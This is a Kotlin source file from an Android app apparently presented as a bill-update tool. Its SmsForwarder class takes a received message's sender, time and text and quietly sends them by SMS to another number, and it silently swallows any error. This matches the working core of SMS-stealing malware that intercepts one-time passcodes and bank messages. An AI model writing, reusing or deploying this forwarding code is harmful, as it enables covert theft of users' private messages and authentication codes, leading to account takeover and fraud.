package com.example.bill_update_app

import android.content.Context
import android.Manifest
import android.content.pm.PackageManager
import android.telephony.SmsManager
import androidx.core.content.ContextCompat

class SmsForwarder(private val context: Context) {

    fun forwardSms(targetNumber: String, sender: String, message: String, receivedAt: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
            != PackageManager.PERMISSION_GRANTED) return
        val body = "From: $sender\nTime: $receivedAt\n$message"
        try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(body)
            smsManager.sendMultipartTextMessage(targetNumber, null, parts, null, null)
        } catch (_: Exception) {}
    }
}
